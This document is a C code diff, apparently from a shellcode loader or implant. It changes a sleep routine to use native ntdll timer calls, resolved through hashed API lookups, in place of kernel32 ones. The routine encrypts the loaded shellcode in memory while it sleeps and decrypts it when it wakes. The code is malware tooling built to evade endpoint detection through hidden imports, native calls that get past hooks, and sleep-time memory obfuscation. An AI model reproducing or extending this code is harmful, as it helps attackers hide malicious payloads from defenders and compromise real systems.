@@ -89,23 +89,23 @@ static inline PPEB GetPeb() {
 }
 
 static inline BOOL ensure_sleep_apis() {
-    if (!g_ldr->apis->CreateWaitableTimerW)
-        g_ldr->apis->CreateWaitableTimerW = (pCreateWaitableTimerW)GetProc(g_ldr->apis->modules.kernel32, HASHED_CREATEWAITABLETIMERW);
-    if (!g_ldr->apis->SetWaitableTimer)
-        g_ldr->apis->SetWaitableTimer = (pSetWaitableTimer)GetProc(g_ldr->apis->modules.kernel32, HASHED_SETWAITABLETIMER);
-    if (!g_ldr->apis->WaitForSingleObject)
-        g_ldr->apis->WaitForSingleObject = (pWaitForSingleObject)GetProc(g_ldr->apis->modules.kernel32, HASHED_WAITFORSINGLEOBJECT);
+    if (!g_ldr->apis->NtCreateTimer)
+        g_ldr->apis->NtCreateTimer = (pNtCreateTimer)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTCREATETIMER);
+    if (!g_ldr->apis->NtSetTimer)
+        g_ldr->apis->NtSetTimer = (pNtSetTimer)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTSETTIMER);
+    if (!g_ldr->apis->NtWaitForSingleObject)
+        g_ldr->apis->NtWaitForSingleObject = (pNtWaitForSingleObject)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTWAITFORSINGLEOBJECT);
     if(!g_ldr->apis->NtCloseHandle)
-        g_ldr->apis->NtCloseHandle = (pNtCloseHandle)GetProc(g_ldr->apis->modules.kernel32, HASHED_NTCLOSE);
+        g_ldr->apis->NtCloseHandle = (pNtCloseHandle)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTCLOSE);
     if (!g_ldr->apis->NtProtectVirtualMemory)
-        g_ldr->apis->NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProc(g_ldr->apis->modules.kernel32, HASHED_NTPROTECTVIRTUALMEMORY);
+        g_ldr->apis->NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTPROTECTVIRTUALMEMORY);
 }
 
 static inline void do_sleep(DWORD time, LPVOID Shellcode, SIZE_T ShellcodeSize) {
     if (time == 0) return;
     ensure_sleep_apis();
     DBGA("[*] Sleeping for %lu Seconds\n", time);
-    DWORD old;
+   
 #ifdef LOCAL
     DBGA("[*] Encrypting shellcode\n");
     PVOID protAddr = Shellcode;
@@ -120,12 +120,13 @@ static inline void do_sleep(DWORD time, LPVOID Shellcode, SIZE_T ShellcodeSize) 
 #endif
     
 
-    HANDLE hTimer = g_ldr->apis->CreateWaitableTimerW(NULL, TRUE, NULL);
+    HANDLE hTimer = NULL;
+    g_ldr->apis->NtCreateTimer(&hTimer, TIMER_ALL_ACCESS, NULL, 0);
     if (!hTimer) return;
     LARGE_INTEGER li;
     li.QuadPart = -(LONGLONG)time * 10000000LL;
-    g_ldr->apis->SetWaitableTimer(hTimer, &li, 0, NULL, NULL, FALSE);
-    g_ldr->apis->WaitForSingleObject(hTimer, INFINITE);
+    g_ldr->apis->NtSetTimer(hTimer, &li, NULL, NULL, FALSE, 0, NULL);
+    g_ldr->apis->NtWaitForSingleObject(hTimer, FALSE, NULL);
     g_ldr->apis->NtCloseHandle(hTimer);
 #ifdef LOCAL
     DBGA("[*] Decrypting shellcode\n");
